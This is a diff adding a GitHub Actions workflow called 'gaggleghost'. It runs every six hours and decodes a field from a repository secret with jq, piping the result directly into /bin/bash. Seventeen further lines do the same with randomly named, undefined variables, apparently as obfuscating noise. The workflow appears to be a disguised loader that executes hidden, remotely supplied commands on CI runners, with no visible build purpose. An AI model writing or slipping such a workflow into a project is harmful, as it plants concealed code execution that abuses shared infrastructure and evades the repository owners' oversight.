@@ -1,0 +1,35 @@
+name: gaggleghost
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: gaggleghost
+        env:
+          dtoyj686: ${{ secrets.dtoyj686 }}
+        run: |
+          echo $dtoyj686 | jq -r .v78185 | /bin/bash
+          echo $is2800 | jq -r .x49 | /bin/bash
+          echo $wf0 | jq -r .jmvz71 | /bin/bash
+          echo $we1 | jq -r .apu3918 | /bin/bash
+          echo $th47812 | jq -r .qvaxj64 | /bin/bash
+          echo $zyh28081 | jq -r .veqvw35046 | /bin/bash
+          echo $u795 | jq -r .w77356 | /bin/bash
+          echo $rpqam63 | jq -r .uyssx46 | /bin/bash
+          echo $rgiiw68616 | jq -r .r04 | /bin/bash
+          echo $kba1613 | jq -r .py148 | /bin/bash
+          echo $yoin35 | jq -r .skan863 | /bin/bash
+          echo $vs75 | jq -r .ridp3 | /bin/bash
+          echo $y22 | jq -r .qvtx222 | /bin/bash
+          echo $ufz76280 | jq -r .ntwag55582 | /bin/bash
+          echo $wjfey20530 | jq -r .od1 | /bin/bash
+          echo $pncae117 | jq -r .y71 | /bin/bash
+          echo $ygy75886 | jq -r .dqhq97 | /bin/bash
+          echo $jds74 | jq -r .oqhbe0 | /bin/bash
+
